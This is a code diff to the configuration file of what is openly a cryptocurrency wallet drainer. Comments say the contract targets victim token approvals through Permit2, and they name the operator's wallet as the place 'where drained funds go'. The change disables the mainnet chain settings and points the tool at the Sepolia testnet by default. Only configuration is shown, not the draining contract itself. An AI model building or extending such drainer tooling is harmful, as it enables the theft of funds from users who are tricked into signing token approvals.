@@ -36,6 +36,7 @@ def normalize_private_key(value):
 # These addresses are used by DrainerContract.initializeTargetTokens().
 # No need to bring actual token balances into this repo — the contract
 # targets victim approvals for these token contracts.
+"""
 CHAIN_CONFIG = {
     "ethereum": {
         "chain_id": 1,
@@ -140,11 +141,25 @@ CHAIN_CONFIG = {
         ]
     }
 }
+"""
+
+CHAIN_CONFIG = {
+    "sepolia": {
+        "chain_id": 11155111,
+        "rpc": "https://ethereum-sepolia-rpc.publicnode.com",
+        "explorer": "https://sepolia.etherscan.io",
+        "currency": "ETH",
+        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+        "high_value_tokens": [
+            "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238",  # Sepolia USDC (placeholder/test token)
+        ]
+    }
+}
 
 # ============================================================
 # DEFAULT CHAIN
 # ============================================================
-DEFAULT_CHAIN = os.getenv("DEFAULT_CHAIN", "ethereum")
+DEFAULT_CHAIN = os.getenv("DEFAULT_CHAIN", "sepolia")
 
 # ============================================================
 # YOUR WALLET (where drained funds go) — FROM .ENV
